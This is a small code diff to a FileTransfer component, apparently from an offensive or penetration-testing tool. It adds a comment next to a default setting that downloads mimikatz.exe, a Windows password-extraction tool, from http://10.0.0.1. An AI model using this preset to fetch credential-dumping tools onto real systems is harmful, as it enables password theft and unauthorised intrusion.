@@ -17,7 +17,7 @@ export default function FileTransfer () {
         ip: '',
         port: '',
         target_file_name: 'http://10.0.0.1/mimikatz.exe',
-        output_file_name: 'mimikatz.exe',
+        output_file_name: 'mimikatz.exe',  //mimikatz is a password pwd(Extractions) tools for windows_x64 or x32
         shell: '/bin/sh'
     } );
 
